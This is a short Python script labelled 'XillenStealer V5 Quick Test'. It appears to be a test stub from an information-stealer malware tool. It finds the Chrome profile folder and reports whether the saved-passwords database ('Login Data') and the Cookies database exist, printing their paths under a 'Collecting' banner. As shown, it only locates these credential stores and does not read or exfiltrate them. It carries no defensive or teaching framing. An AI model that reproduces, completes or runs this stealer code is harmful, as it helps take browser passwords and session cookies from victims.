import os
import sqlite3
import base64
import json
from pathlib import Path

def collect_chrome():
    result = []
    chrome_path = Path(os.environ['LOCALAPPDATA']) / 'Google' / 'Chrome' / 'User Data' / 'Default'
    
    if not chrome_path.exists():
        return "Chrome not found"
    
    passwords_db = chrome_path / 'Login Data'
    cookies_db = chrome_path / 'Cookies'
    
    if passwords_db.exists():
        result.append(f"Found passwords DB: {passwords_db}")
    if cookies_db.exists():
        result.append(f"Found cookies DB: {cookies_db}")
    
    return "\n".join(result) if result else "No Chrome data found"

print("XillenStealer V5 Quick Test")
print("=" * 40)
print("\n[*] Collecting...\n")
print(collect_chrome())
